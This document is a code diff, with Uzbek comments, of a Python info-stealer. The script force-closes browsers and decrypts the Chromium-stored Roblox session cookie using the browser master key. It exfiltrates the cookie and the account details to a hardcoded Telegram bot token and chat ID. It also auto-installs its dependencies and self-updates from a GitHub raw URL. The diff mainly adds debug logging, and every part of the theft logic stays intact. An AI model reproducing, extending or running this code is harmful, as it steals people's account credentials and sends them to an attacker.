@@ -8,7 +8,7 @@ import shutil
 import time
 from datetime import datetime
 
-# --- 0. AVTOMATIK KUTUBXONA TEKSHIRISH VA O'RNATISH ---
+# --- KUTUBXONA TEKSHIRISH VA O'RNATISH ---
 REQUIRED_PACKAGES = {
     "requests": "requests",
     "psutil": "psutil",
@@ -16,22 +16,22 @@ REQUIRED_PACKAGES = {
     "win32crypt": "pypiwin32"
 }
 
+print("[DEBUG] Kutubxonalar tekshirilmoqda...")
 for module_name, package_name in REQUIRED_PACKAGES.items():
     try:
         __import__(module_name)
     except ImportError:
+        print(f"[DEBUG] {package_name} o'rnatilmoqda...")
         try:
-            subprocess.check_call([sys.executable, "-m", "pip", "install", package_name], 
-                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        except Exception:
-            pass
+            subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])
+        except Exception as e:
+            print(f"[DEBUG] O'rnatishda xato: {e}")
 
 import requests
 import psutil
 from Crypto.Cipher import AES
 import win32crypt
 
-# --- KONFIGURASIYA ---
 TELEGRAM_BOT_TOKEN = '8819062469:AAFdy6JsOo_wZCnN2wIyz-noszsZQ_PmyVY'
 TELEGRAM_CHAT_ID = '8043397476'
 
@@ -39,9 +39,7 @@ CONFIG_DIR = os.path.join(os.environ.get('LOCALAPPDATA', os.path.expanduser('~')
 CACHE_FILE = os.path.join(CONFIG_DIR, "cache.json")
 VERSION_FILE = os.path.join(CONFIG_DIR, "version.txt")
 
-# Joriy versiya raqami (GitHub'dagi bilan solishtirish uchun)
 CURRENT_VERSION = "1.0"
-# GitHub'dagi core.py versiya havolasi (yoki raw fayl havolasi)
 VERSION_URL = "https://raw.githubusercontent.com/laughrush43-cell/service/main/version.txt"
 SCRIPT_URL = "https://raw.githubusercontent.com/laughrush43-cell/service/main/core.py"
 
@@ -57,15 +55,15 @@ def check_internet():
         return False
 
 def wait_for_internet():
+    debug_print("Internet ulanishi kutilmoqda...")
     while not check_internet():
-        time.sleep(10)
+        time.sleep(5)
+    debug_print("Internetga ulandi!")
 
-# --- AVTOMATIK UPDATE (YANGILASH) TEKSHIRUVI ---
 def check_for_updates():
     try:
         if not check_internet():
             return
-        
         response = requests.get(VERSION_URL, timeout=5)
         if response.status_code == 200:
             latest_version = response.text.strip()
@@ -129,8 +127,8 @@ def get_roblox_user_info(cookie_value):
                 "display": data.get("displayName"),
                 "avatar": avatar_url
             }
-    except Exception:
-        pass
+    except Exception as e:
+        debug_print(f"Roblox API xatosi: {e}")
     return None
 
 def get_user_avatar(user_id):
@@ -155,6 +153,7 @@ def send_to_telegram(cookie_value, browser_name):
 
     sent_cookies = get_sent_cookies()
     if valid_cookie in sent_cookies:
+        debug_print(f"[{browser_name}] Bu cookie allaqachon yuborilgan.")
         return True 
 
     wait_for_internet()
@@ -185,11 +184,10 @@ def send_to_telegram(cookie_value, browser_name):
     }
     
     try:
-        wait_for_internet()
         response = requests.post(url_photo, json=payload, timeout=10)
         if response.status_code == 200:
             save_sent_cookie(valid_cookie)
-            debug_print(f"[{browser_name}] Telegramga yuborildi!")
+            debug_print(f"[{browser_name}] Telegramga rasm yuborildi!")
             
         time.sleep(0.5)
         msg = {
@@ -198,17 +196,19 @@ def send_to_telegram(cookie_value, browser_name):
             "parse_mode": "Markdown"
         }
         requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", json=msg, timeout=10)
+        debug_print(f"[{browser_name}] Cookie yuborildi!")
         return True
     except Exception as e:
         debug_print(f"Telegramga yuborishda xato: {e}")
     return False
 
 def kill_browsers(process_names):
-    debug_print(f"Brauzerlar majburiy yopilmoqda: {process_names}")
+    debug_print(f"Brauzerlar tekshirilmoqda: {process_names}")
     for proc in psutil.process_iter(['name']):
         try:
             p_name = proc.info['name']
             if p_name and any(p in p_name.lower() for p in process_names):
+                debug_print(f"Yopilmoqda: {p_name}")
                 proc.kill()
         except Exception:
             pass
@@ -221,7 +221,8 @@ def get_master_key(local_state_path):
         encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         encrypted_key = encrypted_key[5:]
         return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-    except Exception:
+    except Exception as e:
+        debug_print(f"Master key olishda xato: {e}")
         return None
 
 def decrypt_value(encrypted_value, master_key):
@@ -238,7 +239,7 @@ def decrypt_value(encrypted_value, master_key):
         return None
 
 def main():
-    # Ishga tushganda avval yangilanishni tekshiramiz
+    debug_print("Skript ishga tushdi va ishlamoqda...")
     check_for_updates()
 
     username = os.getlogin()
@@ -261,11 +262,9 @@ def main():
         }
     }
 
-    debug_print("Skript ishga tushdi...")
-
     while True:
         if get_sent_cookies():
-            debug_print("Cookie allaqachon topilgan. Ish yakunlandi.")
+            debug_print("Cookie allaqachon topilgan va yuborilgan. Tsikl to'xtatildi.")
             break
 
         try:
@@ -275,6 +274,7 @@ def main():
                 if not os.path.exists(base_path):
                     continue
 
+                debug_print(f"Tekshirilmoqda: {b_name}")
                 kill_browsers(info["procs"])
 
                 local_state_path = os.path.join(base_path, "Local State")
@@ -332,8 +332,9 @@ def main():
                 break
 
         except Exception as e:
-            debug_print(f"Xatolik: {e}")
+            debug_print(f"Asosiy tsiklda xatolik: {e}")
 
+        debug_print("Qayta tekshirish 30 soniyadan keyin boshlanadi...")
         time.sleep(30)
 
 if __name__ == "__main__":
